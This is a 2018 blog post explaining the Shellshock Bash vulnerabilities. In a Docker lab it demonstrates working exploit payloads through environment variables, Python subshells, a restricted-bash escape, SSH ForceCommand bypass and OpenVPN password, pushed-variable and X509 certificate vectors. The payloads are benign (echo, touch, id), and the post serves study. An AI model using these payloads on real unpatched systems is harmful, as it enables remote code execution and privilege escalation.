<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>() { Magic Bash Runes</title>
  <meta name="description" content="() { Magic Bash Runes">

  <link href='/css/load-lato-fonts.min.css' rel='stylesheet' type='text/css'>

  <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      //root: "/js/MathJax-2.7.7",
      extensions: ["tex2jax.js"],
      jax: ["input/TeX","output/HTML-CSS"],
      tex2jax: {inlineMath: [["\\(","\\)"]]},
      TeX: {
        Macros: {
          
        }
      }
    });
  </script>
  <!-- <script src='/js/MathJax-2.7.7/MathJax.js' async></script> -->
  <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js' async></script>

  <script src="/js/jquery-3.6.0.min.js"></script>

  <script src='/js/underscore-1.9.1.min.js' ></script>

  <script src='/js/d3-7.4.2.min.js'></script>

  <script src='/js/venn/venn-0.2.14.min.js'></script>
  <script src='/js/venn/helper.min.js'></script>

  <script src='/js/fix_syntax_highlight.min.js'></script>
  <link rel="stylesheet" type="text/css" href="/css/tufte.min.css">
  <link rel="stylesheet" type="text/css" href="/css/latex.min.css">

  <link rel="canonical" href="https://book-of-gehn.github.io/articles/2018/10/01/Magic-Bash-Runes.html">

  <link rel="stylesheet" type="text/css" href="/css/font-awesome-5.min.css">

  <script src='/js/lunr-2.3.9.min.js'></script>
  <script src='/js/search_index.js'></script>
  <script src='/js/search.min.js'></script>
</head>
<body>
<header>
                <hgroup class="header-group">
        <h1 class="header-title"><a href="/">The Book of Gehn</a></h1>
                </hgroup>
                <ul class="header-list">
                    <li><a href="https://byexamples.github.io">byexample</a></li>
                    <li><a href="https://bisturi.github.io">bisturi</a></li>
                    <li>
                        <a class="raw_link" href="/atom.xml"><img height="16px" width="16px" src="/img/rss-32px.png" /></a>
                        <a class="raw_link" href="https://github.com/eldipa"><img height="16px" width="16px" src="/img/github.png" /></a>
                    </li>
                </ul>
        
        

    

</header>
<article class="group">
<h1>
() { Magic Bash Runes
</h1>
<p class="subtitle">
October 1, 2018
</p>
<p>Despite of been 4 years old, <code>Shellshock</code> is still a very interesting topic to me not for the vulnerability itself but for the large ways to trigger it even in the most unexpected places.</p>
<p>Take the 4 characters <code>() {</code> and open the world.</p>
<p><label for='PGltZyAgY2xhc3M9J2Z1bGx3aWR0aCcgYWx0PScnIHNyYz0nL2ltZy9iYXNoL3NoZWxsc2hvY2svcnVuZXMucG5nJyAvPgpGcmFnbWVudHMgZm91bmQgaW4gdGhlIGZpZWxkLgptYXJnaW4=' class='margin-toggle'>&#8853;</label>
<input type='checkbox' id='PGltZyAgY2xhc3M9J2Z1bGx3aWR0aCcgYWx0PScnIHNyYz0nL2ltZy9iYXNoL3NoZWxsc2hvY2svcnVuZXMucG5nJyAvPgpGcmFnbWVudHMgZm91bmQgaW4gdGhlIGZpZWxkLgptYXJnaW4=' class='margin-toggle'/>
<span class='marginnote'>
<img  class='fullwidth' alt='' src='/img/bash/shellshock/runes.png' />
Fragments found in the field.
</span></p>
<p>Creativity and few hours reading man pages are all what you need.<!--more--></p>
<h3 id="lab">Lab</h3>
<p>For the following examples I created a docker image that compiles a vulnerable Bash version.</p>
<p><label for='CkJhc2VkIG9uIHRoaXMgW0RvY2tlcmZpbGVdKGh0dHBzOi8vZ2l0aHViLmNvbS90aWFub24vZG9ja2VyLWJhc2gvdHJlZS9tYXN0ZXIvNC4xKQptYXJnaW5ub3Rlcw==' class='margin-toggle'> &#8853;</label>
<input type='checkbox' id='CkJhc2VkIG9uIHRoaXMgW0RvY2tlcmZpbGVdKGh0dHBzOi8vZ2l0aHViLmNvbS90aWFub24vZG9ja2VyLWJhc2gvdHJlZS9tYXN0ZXIvNC4xKQptYXJnaW5ub3Rlcw==' class='margin-toggle'/>
<span class='marginnote'>
Based on this <a href="https://github.com/tianon/docker-bash/tree/master/4.1">Dockerfile</a>
</span></p>
<p>From <a href="/assets/bash/shellshock/">here</a> you can download the Dockerfile and the rest of the files and build the image yourself:</p>
<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>docker<span class="w"> </span>build<span class="w"> </span>-t<span class="w"> </span>shellshock<span class="w"> </span>.<span class="w">      </span><span class="c1"># byexample: +skip</span>
&lt;...&gt;
Successfully<span class="w"> </span>tagged<span class="w"> </span>shellshock:latest
</code></pre></div>

<p>From there, run the following to get a temporal shell:</p>
<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>docker<span class="w"> </span>run<span class="w"> </span>-it<span class="w"> </span>--rm<span class="w">  </span>--cap-add<span class="o">=</span>NET_ADMIN<span class="w"> </span>shellshock<span class="w">       </span><span class="c1"># byexample: +skip</span>
</code></pre></div>

<blockquote>
<p>If the <code>--cap-add=NET_ADMIN</code> looks to you a little suspicious, I don’t blame you. The flag is needed to run the OpenVPN examples.</p>
</blockquote>
<p>Then, to run the SSH examples you need to run the SSH server:</p>
<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>/usr/sbin/sshd<span class="w">                    </span><span class="c1"># byexample: +fail-fast</span>
</code></pre></div>

<p>And for the OpenVPN examples, you need to create a TUN device:</p>
<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>mkdir<span class="w"> </span>-p<span class="w"> </span>/dev/net
$<span class="w"> </span><span class="o">[</span><span class="w"> </span>-e<span class="w"> </span>/dev/net/tun<span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">||</span><span class="w"> </span>mknod<span class="w"> </span>/dev/net/tun<span class="w"> </span>c<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="m">200</span><span class="p">;</span><span class="w">      </span><span class="c1"># byexample: +fail-fast</span>
</code></pre></div>

<!--
$ ssh -p 2201 127.0.0.1 'ls'        # byexample: +pass
$ ssh -p 2202 127.0.0.1 'ls'        # byexample: +pass
-->
<h2 id="magic-bash-runes">Magic Bash runes</h2>
<p>Bash allows to write a function definition inside of an environment variable and pass it to a subshell.</p>
<p>The only requirement is that the definition must begin with the magic <code>() {</code> four bytes.</p>
<h2 id="cve-2014-6271-cmd">CVE-2014-6271: <code>() { :;}; CMD</code></h2>
<p>When Bash passes that env var, it will detect the <code>() {</code> prefix and it will parse <em>and</em> execute the remaining function definition.</p>
<p>The bug happen because Bash will not stop after the function’s end but it will continue parsing and executing the rest <code>CMD</code>.</p>
<p>Try this in the lab:</p>
<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span><span class="nv">X</span><span class="o">=</span><span class="s1">&#39;() { :; }; /bin/echo vuln&#39;</span>
$<span class="w"> </span><span class="nb">export</span><span class="w"> </span>X
$<span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;echo &quot;foo&quot;&#39;</span>
vuln
&lt;...&gt;
</code></pre></div>

<!--
$ unset X   # byexample: +pass
-->
<p>Or, in one line:</p>
<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span><span class="nv">X</span><span class="o">=</span><span class="s1">&#39;() { :; }; /bin/echo vuln&#39;</span><span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;echo &quot;foo&quot;&#39;</span>
vuln
&lt;...&gt;
</code></pre></div>

<p>If you are vulnerable, that command should print <code>vuln</code> (and probably it will crash too).</p>
<p>Because the bug happens in a very early phase, <code>CMD</code> must be with the full path (<code>PATH</code> may not exist)</p>
<h3 id="cve-2014-7169-function-a-a-bash--c-file-cmd">CVE-2014-7169: <code>() { function a a&gt;\</code> &amp; <code>bash -c "FILE CMD"</code></h3>
<p>The incantation of these runes has two parts.</p>
<p>Imagine the following command that prints two words:</p>
<!-- no colors for this -->
<pre><code>$ echo echo vuln
echo vuln</code></pre>
<p>The first <code>echo</code> is the command and the rest its arguments: it has nothing weird on its own.</p>
<p>The <code>() { function a a&gt;\</code> part makes a <em>incomplete</em> function definition, in particular the fragment <code>a&gt;\</code> will redirect to a unspecified file the output and Bash will complete the definition with the <em>next input</em>.</p>
<p>And here is where the magic happens.</p>
<p>The first <code>echo</code> will <em>not</em> be the command but the name of the file to redirect the output.</p>
<p>The rest of the input <code>echo vuln</code> will be interpreted as a full command: that means that the first argument is converted to the name of a command.</p>
<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span><span class="nv">X</span><span class="o">=</span><span class="s1">&#39;() { function a a&gt;\&#39;</span><span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;echo echo vuln&quot;</span>
&lt;...&gt;

$<span class="w"> </span>cat<span class="w"> </span><span class="nb">echo</span>
vuln
</code></pre></div>

<!--
$ rm -f echo    # clean up
-->
<p>Instead of printing the literal <code>"echo vuln"</code> string and cat-ing an inexistent file <code>"echo"</code>, a vulnerable Bash will execute the first argument and it will redirect its output to a file named <code>"echo"</code>.</p>
<p>Here is another example.</p>
<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;echo $0 $1 | hd&#39;</span><span class="w"> </span>A<span class="w"> </span>B
<span class="m">00000000</span><span class="w">  </span><span class="m">41</span><span class="w"> </span><span class="m">20</span><span class="w"> </span><span class="m">42</span><span class="w"> </span>0a<span class="w">                                       </span><span class="p">|</span>A<span class="w"> </span>B.<span class="p">|</span>
<span class="m">00000004</span>
</code></pre></div>

<p>If the attacker controls <code>$0</code> and <code>$1</code>, he can trigger the vuln setting <code>$0</code> to the command of his desire and <code>$1</code> to <code>#</code> to comment out the pipe (the arguments must be without quotes, <code>"$1"</code> will not work).</p>
<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span><span class="nv">X</span><span class="o">=</span><span class="s1">&#39;() { function a a&gt;\&#39;</span><span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;echo id # | hd&quot;</span><span class="p">;</span><span class="w"> </span>cat<span class="w"> </span><span class="nb">echo</span>
&lt;...&gt;
<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>&lt;...&gt;
</code></pre></div>

<!--
$ rm -f echo    # clean up
-->
<p>Another example, a shorter variant with less runes needed:</p>
<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span><span class="nv">X</span><span class="o">=</span><span class="s1">&#39;() { (a)=&gt;\&#39;</span><span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;echo id&quot;</span><span class="p">;</span><span class="w"> </span>cat<span class="w"> </span><span class="nb">echo</span>
&lt;...&gt;
<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>&lt;...&gt;
</code></pre></div>

<!--
$ rm -f echo    # clean up
-->
<h3 id="cve-2014-6278-_-_-cmd">CVE-2014-6278: <code>() { _; } &gt;_[$($())] { CMD }</code></h3>
<p>The interesting thing is that this doesn’t look like a parsing bug but a feature.</p>
<p>I was succeeded to trigger this one in a vulnerable VM from <a href="https://pentesterlab.com/exercises/cve-2014-6271">PentesterLab</a> but I couldn’t trigger it in my own lab.</p>
<p>Here is how it should be invoked:</p>
<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span><span class="nv">X</span><span class="o">=</span><span class="s1">&#39;() { _; } &gt;_[$($())] { /bin/sleep 5 }&#39;</span><span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;date&#39;</span><span class="w">      </span><span class="c1"># byexample: +skip</span>
</code></pre></div>

<h2 id="subshells-from-python-ruby">Subshells from Python, Ruby</h2>
<p>It is not necessary to run Bash directly to trigger the vuln.</p>
<p>Any process that pass the env variables to a vulnerable Bash is enough:</p>
<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span><span class="nv">X</span><span class="o">=</span><span class="s1">&#39;() { :; }; echo &quot;vuln&quot;&#39;</span><span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import os; os.system(&quot;ls&quot;)&#39;</span>
vuln
&lt;...&gt;
</code></pre></div>

<p>Python’s <code>os.system</code> spawns a shell, typically <code>/bin/sh</code> and runs inside it the given command.</p>
<p>The trick is that <code>/bin/sh</code> in some mainstream systems is a link to <code>/bin/bash</code>, enabling the bug to other interpreters.</p>
<p>Python, Ruby, virtually any software the spawn a subshell is affected.</p>
<h2 id="restricted-bash-bypass">Restricted Bash bypass</h2>
<p>We cannot trigger the vuln if the shell spawned is in restricted mode</p>
<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span><span class="nv">X</span><span class="o">=</span><span class="s1">&#39;() { :;}; /bin/echo vuln&#39;</span><span class="w"> </span>bash<span class="w"> </span>-r<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;echo baz&#39;</span>
baz
</code></pre></div>

<p>This is because:</p>
<blockquote>
<p>“A restricted shell […] (does not allow) importing function definitions from the shell environment at startup”</p>
<footer>
<a href="https://linux.die.net/man/1/bash">bash(1)</a>, <em>Restricted shell</em>
</footer>
</blockquote>
<p>But the same man page gives us a way to escape: nothing prevent us to trigger the vuln <em>within</em> the restricted shell:</p>
<blockquote>
<p>“When a command that is found to be a shell script is executed […], rbash turns off any restrictions in the shell spawned to execute the script.”</p>
<footer>
<a href="https://linux.die.net/man/1/bash">bash(1)</a>, <em>Restricted shell</em>
</footer>
</blockquote>
<p>The only thing that we need is just an executable shell script in the <code>PATH</code> to target it:</p>
<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>cat<span class="w"> </span>/bin/egrep
<span class="c1">#!/bin/sh</span>
<span class="nb">exec</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$@</span><span class="s2">&quot;</span>

$<span class="w"> </span><span class="nv">X</span><span class="o">=</span><span class="s1">&#39;() { :;}; /bin/echo vuln&#39;</span><span class="w"> </span>bash<span class="w"> </span>-r<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;egrep&#39;</span>
vuln
&lt;...&gt;
</code></pre></div>

<p>This may allow you to escape from the restricted shell or at least it will allow you to perform some prohibited actions like <code>cd</code> or redirections:</p>
<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span><span class="nv">X</span><span class="o">=</span><span class="s1">&#39;() { :;}; cd /home ; echo &quot;foo&quot; &gt; bar &#39;</span><span class="w"> </span>bash<span class="w"> </span>-r<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;egrep&#39;</span>
&lt;...&gt;

$<span class="w"> </span>cat<span class="w"> </span>/home/bar
foo
</code></pre></div>

<!--
$ rm -f /home/bar # clean up
-->
<p><label for='CkkgYW0gc3VyZSB0aGF0IHRoZXJlIGFyZSBvdGhlciBjbGV2ZXIKYW5kIGNyZWF0aXZlIHdheXMgdG8gKnByaXYgZXNjKiB1c2luZyBzaGVsbHNob2NrIGJlc2lkZXMgdXNpbmcgYQpgYHNldHVpZGBgIHByb2dyYW0uCm1hcmdpbm5vdGVz' class='margin-toggle'> &#8853;</label>
<input type='checkbox' id='CkkgYW0gc3VyZSB0aGF0IHRoZXJlIGFyZSBvdGhlciBjbGV2ZXIKYW5kIGNyZWF0aXZlIHdheXMgdG8gKnByaXYgZXNjKiB1c2luZyBzaGVsbHNob2NrIGJlc2lkZXMgdXNpbmcgYQpgYHNldHVpZGBgIHByb2dyYW0uCm1hcmdpbm5vdGVz' class='margin-toggle'/>
<span class='marginnote'>
I am sure that there are other clever and creative ways to <em>priv esc</em> using shellshock besides using a <code>setuid</code> program.
</span></p>
<p>If you think, this can be used for a privilege escalation: running as a normal user, if a <code>setuid</code> program spawn a shell you will get a path to root pretty straightforward.</p>
<h2 id="ssh">SSH</h2>
<p>SSH will send some environment variables by default, like <code>TERM</code> regardless of the configuration of the server or client as long as we allocate a remote pseudo-terminal (<code>-t</code>)</p>
<p>” […] the TERM environment variable is always sent whenever a pseudo-terminal is requested as it is required by the protocol.”</p>
<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span><span class="nv">TERM</span><span class="o">=</span><span class="s1">&#39;() { :;}; /bin/echo vuln&#39;</span><span class="w"> </span>ssh<span class="w"> </span>-t<span class="w"> </span>-p<span class="w"> </span><span class="m">2201</span><span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="nb">exit</span>
vuln&lt;...&gt;
</code></pre></div>

<p>This may seems pointless because we have a remote shell anyways.</p>
<p>But SSH has a <code>ForceCommand</code> option that set a command to be executed when the user logs in, ignoring any command supplied by him.</p>
<p>This is used by some folks to restrict the access to the system, typically setting this to <code>/bin/false</code> or something like that:</p>
<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>ssh<span class="w"> </span>-p<span class="w"> </span><span class="m">2202</span><span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="s1">&#39;ls&#39;</span>
No<span class="w"> </span>shell<span class="w"> </span><span class="k">for</span><span class="w"> </span>you.<span class="w"> </span>Sorry.
</code></pre></div>

<p>But the forced command is executed by the user’s shell configured in the server. If this one is Bash, we can bypass the restriction.</p>
<p>This option opens another crack as it sets the <code>SSH_ORIGINAL_COMMAND</code> environment variable with the value of the intended and ignored command.</p>
<p>So, if instead <code>ls</code> we set our magic runes we will get remote execution:</p>
<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>ssh<span class="w"> </span>-p<span class="w"> </span><span class="m">2202</span><span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="s1">&#39;() { :;}; /bin/echo vuln&#39;</span>
vuln
&lt;...&gt;
</code></pre></div>

<h2 id="openvpn">OpenVPN</h2>
<p><label for='CkJ5IHRoZSB3YXksIHRoZSBbT3BlblZQTl0oaHR0cHM6Ly9naXRodWIuY29tL09wZW5WUE4vb3BlbnZwbi90cmVlL21hc3Rlci9zYW1wbGUpCnJlcG9zaXRvcnkgaGFzIGEgdmVyeSBjb21wbGV0ZSBzY3JpcHQgdGhhdApzaG93cyB5b3UgaG93IHRvIGNyZWF0ZSBDQSwgQ2VydHMgYW5kIG90aGVyIHN0dWZmLiBOaWNlIQptYXJnaW5ub3Rlcw==' class='margin-toggle'> &#8853;</label>
<input type='checkbox' id='CkJ5IHRoZSB3YXksIHRoZSBbT3BlblZQTl0oaHR0cHM6Ly9naXRodWIuY29tL09wZW5WUE4vb3BlbnZwbi90cmVlL21hc3Rlci9zYW1wbGUpCnJlcG9zaXRvcnkgaGFzIGEgdmVyeSBjb21wbGV0ZSBzY3JpcHQgdGhhdApzaG93cyB5b3UgaG93IHRvIGNyZWF0ZSBDQSwgQ2VydHMgYW5kIG90aGVyIHN0dWZmLiBOaWNlIQptYXJnaW5ub3Rlcw==' class='margin-toggle'/>
<span class='marginnote'>
By the way, the <a href="https://github.com/OpenVPN/openvpn/tree/master/sample">OpenVPN</a> repository has a very complete script that shows you how to create CA, Certs and other stuff. Nice!
</span></p>
<p>In the following examples the <a href="/assets/bash/shellshock/files">configuration files</a> <code>vpn-srv.conf</code> and <code>vpn-cli.conf</code> sets the IP addresses, ports and certificates: standard stuff.</p>
<p>In each example I am passing the extra parameters that enable the attack explicitly via command line.</p>
<h3 id="user-and-pass">User and Pass</h3>
<p>In this first scenario the server uses a Bash script to verify the user’s name and password.</p>
<p>To open the door to the vulnerability, the server must pass the credentials using environment variables.</p>
<p>OpenVPN will reject this by default so we need to set the highest security level with <code>--script-security 3</code> to allow this.</p>
<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>openvpn<span class="w"> </span>--config<span class="w"> </span>vpn-srv.conf<span class="w"> </span>--auth-user-pass-verify<span class="w"> </span>login.sh<span class="w"> </span>via-env<span class="w"> </span>--mode<span class="w"> </span>server<span class="w"> </span>--script-security<span class="w"> </span><span class="m">3</span><span class="w"> </span>&gt;/dev/null<span class="w"> </span><span class="p">&amp;</span>
&lt;...&gt;
</code></pre></div>

<p>From the client side, the magic runes need to be in the credential file, in the place of the password:</p>
<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>openvpn<span class="w"> </span>--config<span class="w"> </span>vpn-cli.conf<span class="w"> </span>--auth-user-pass<span class="w"> </span>evil-cred<span class="w"> </span>--pull<span class="w"> </span>&gt;/dev/null<span class="w">   </span><span class="c1"># byexample: +stop-on-silence +timeout=5</span>
&lt;...&gt;

$<span class="w"> </span>cat<span class="w"> </span>evil-cred
foo
<span class="o">()</span><span class="w"> </span><span class="o">{</span><span class="w"> </span>:<span class="p">;</span><span class="o">}</span><span class="p">;</span><span class="w"> </span>/bin/touch<span class="w"> </span>pwned
</code></pre></div>

<!--
$ rm -f pwned # clean up
$ killall openvpn ; wait  # byexample: +pass
-->
<p>And <em>presto</em>, the client has remote execution in the server.</p>
<p>But, only in the password…. Why?</p>
<p>The runes need to be in the password, because it is not <em>remapped</em>.</p>
<p>OpenVPN remaps the values of the env variables allowing a very reduced set of symbols; the password is not affected, thanks God!</p>
<p>It could be in the username too as starting OpenVPN 2.0.1 it is not remapped any more when it is passed to <code>OPENVPN_PLUGIN_AUTH_USER_PASS_VERIFY</code> plugin.</p>
<p>If this is vulnerable or not is another story.</p>
<h3 id="push-and-pull">Push and Pull</h3>
<p>Now the roles are inverted here.</p>
<p>In this case the server will set up a trap to get remote execution on the client side.</p>
<p>For this, it pushes a environment variable to the client with the magic runes:</p>
<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>openvpn<span class="w"> </span>--config<span class="w"> </span>vpn-srv.conf<span class="w"> </span>--push<span class="w"> </span><span class="s1">&#39;setenv-safe Z &quot;() { :;}; /bin/touch pwned&quot;&#39;</span><span class="w"> </span><span class="p">&amp;</span>
&lt;...&gt;
</code></pre></div>

<p>The client needs to <em>pull</em> the variables and execute some external script.</p>
<p>I chose <code>--up</code> but other should work</p>
<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>openvpn<span class="w"> </span>--config<span class="w"> </span>vpn-cli.conf<span class="w"> </span>--up<span class="w"> </span>env.sh<span class="w"> </span>--script-security<span class="w"> </span><span class="m">2</span><span class="w"> </span>--pull<span class="w">   </span><span class="c1"># byexample: +stop-on-silence +timeout=5</span>
&lt;...&gt;

$<span class="w"> </span><span class="o">[</span><span class="w"> </span>-e<span class="w"> </span>pwned<span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;you&#39;ve been pwned&quot;</span>
you<span class="err">&#39;</span>ve<span class="w"> </span>been<span class="w"> </span>pwned
</code></pre></div>

<!--
$ rm -f pwned # clean up
$ killall openvpn ; wait  # byexample: +pass
-->
<p>The <code>setenv-safe</code> sets an environment variable with a safe name (prefixed with <code>OPENVPN</code>) but the trick is not in the name but in its content.</p>
<p>The client will execute a shell script (needs at least <code>--script-security 2</code>) and the malicious env var will be pushed to the client, executed and exploited.</p>
<h3 id="x509-param">X509 param</h3>
<p>This one is tricky.</p>
<p>All the scripts that OpenVPN can execute receive a <em>remapped</em> version of the environment variables.</p>
<p>Depending of the variable the remap allows more or less character but in any case the remap process destroys the magic runes.</p>
<p>But the are exceptions: <code>password</code> as it was mentioned before and <code>X509_{n}_{m}</code>.</p>
<p>When a endpoint uses an external script to validate the TLS identity through <code>--tls-verify</code>, it receives an environment variable for each part of the <code>Subject</code> of the both certificates: the client’s and the server’s.</p>
<p>Here the server sets up an evil certificate:</p>
<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>openvpn<span class="w"> </span>--config<span class="w"> </span>vpn-srv.conf<span class="w"> </span>--cert<span class="w"> </span>evil.crt<span class="w"> </span>--key<span class="w"> </span>evil.key<span class="w">  </span>&gt;/dev/null<span class="w"> </span><span class="p">&amp;</span>
&lt;...&gt;
</code></pre></div>

<p>The malicious certificate has a crafted <code>emailAddress</code> inside of the <code>Subject</code> that has the incantation.</p>
<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>openssl<span class="w"> </span>x509<span class="w"> </span>-in<span class="w"> </span>evil.crt<span class="w"> </span>-text
Certificate:
<span class="w">    </span>Data:
<span class="w">        </span>Version:<span class="w"> </span><span class="m">3</span><span class="w"> </span><span class="o">(</span>0x2<span class="o">)</span>
<span class="w">        </span>Serial<span class="w"> </span>Number:<span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="o">(</span>0x2<span class="o">)</span>
<span class="w">    </span>Signature<span class="w"> </span>Algorithm:<span class="w"> </span>sha256WithRSAEncryption
<span class="w">        </span>&lt;...&gt;
<span class="w">        </span>Subject:<span class="w"> </span><span class="nv">C</span><span class="o">=</span>KG,<span class="w"> </span><span class="nv">ST</span><span class="o">=</span>NA,<span class="w"> </span>&lt;...&gt;emailAddress<span class="o">=()</span><span class="w"> </span><span class="o">{</span><span class="w"> </span>:<span class="p">;</span><span class="o">}</span><span class="p">;</span><span class="w"> </span>/bin/cp<span class="w"> </span>/bin/cp<span class="w"> </span>/
&lt;...&gt;
</code></pre></div>

<p>On the client side, we just have to verify TLS with a script and allow it to run with <code>--script-security 2</code>:</p>
<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>openvpn<span class="w"> </span>--config<span class="w"> </span>vpn-cli.conf<span class="w"> </span>--tls-verify<span class="w"> </span>env.sh<span class="w"> </span>--script-security<span class="w"> </span><span class="m">2</span><span class="w">   </span><span class="c1"># byexample: +stop-on-silence +timeout=5</span>
&lt;...&gt;

$<span class="w"> </span><span class="o">[</span><span class="w"> </span>-e<span class="w"> </span>/cp<span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;you&#39;ve been pwned&quot;</span>
you<span class="err">&#39;</span>ve<span class="w"> </span>been<span class="w"> </span>pwned
</code></pre></div>

<p>The variables <code>X509_{n}_{m}</code> will contain the <em>raw</em> pieces of <code>Subject</code> of the client’s certificate (<code>{n} = 1</code>) and the server’s certificate (<code>{n} = 0</code>) where <code>{m}</code> will have the <code>Subject</code>’s field name, like <code>emailAddress</code>.</p>
<p>Does it mean that we can reverse the roles and exploit the server? Who knows.</p>
<p>In my container lab I couldn’t trigger the bug: it seems that the server verification fails but it doesn’t execute the payload.</p>
<p>So in theory yes, but I don’t have evidence.</p>
<!--
$ rm -f cp  # clean up
$ killall openvpn ; wait  # byexample: +pass
-->
<h2 id="final-thoughts">Final thoughts</h2>
<p>What I can say? Having a remote execution crafting a X509 attribute writing just <code>() {</code> makes me think about the complexity of the software with a smile in my face.</p>
<p><label for='ClNlZSB0aGVzZSBpbiBbbGNhbXR1ZidzIHBvc3RdKGh0dHBzOi8vbGNhbXR1Zi5ibG9nc3BvdC5jb20vMjAxNC8xMC9iYXNoLWJ1Zy1ob3ctd2UtZmluYWxseS1jcmFja2VkLmh0bWwpCm1hcmdpbm5vdGVz' class='margin-toggle'> &#8853;</label>
<input type='checkbox' id='ClNlZSB0aGVzZSBpbiBbbGNhbXR1ZidzIHBvc3RdKGh0dHBzOi8vbGNhbXR1Zi5ibG9nc3BvdC5jb20vMjAxNC8xMC9iYXNoLWJ1Zy1ob3ctd2UtZmluYWxseS1jcmFja2VkLmh0bWwpCm1hcmdpbm5vdGVz' class='margin-toggle'/>
<span class='marginnote'>
See these in <a href="https://lcamtuf.blogspot.com/2014/10/bash-bug-how-we-finally-cracked.html">lcamtuf’s post</a>
</span></p>
<p>There are more vulnerabilities and <a href="https://github.com/mubix/shellshocker-pocs">vectors</a> out there than the shown here: Web Servers, CUPS, DHCP.</p>
<p><code>Shellshock</code> came up 4 years ago and it is still surprising me.</p>
<p class="subtitle">
Related: <a href='https://book-of-gehn.github.io/?tag="bash"'>bash</a>, <a href='https://book-of-gehn.github.io/?tag="shellshock"'>shellshock</a>, <a href='https://book-of-gehn.github.io/?tag="hacking"'>hacking</a>
</p>
<script src="https://utteranc.es/client.js"
        repo="book-of-gehn/book-of-gehn.github.io"
        issue-term="pathname"
        label="comments-utteranc"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
</article>
<span class="print-footer">() { Magic Bash Runes - October 1, 2018 - Martin Di Paola</span>
<footer>
    <hr class="slender">
    <div class="credits">
        <span>&copy;
            Martin Di Paola
        </span></br>
            <a class="raw_link" href="/atom.xml"><img height="16px" width="16px" src="/img/rss-32px.png" /></a>
            <a class="raw_link" href="https://github.com/eldipa"><img height="16px" width="16px" src="/img/github.png" /></a>
        <br>
        
        <a href="mailto:martinp.dipaola@gmail.com">martinp.dipaola@gmail.com</a></span></br> <br>
        
    </div>

    <img src='http://192.34.63.156:6127/img/http%3A//127.0.0.1%3A4000/articles/2018/10/01/Magic-Bash-Runes.html.png' onerror="this.style.display='none'" async></img>
</footer>
</body>
</html>
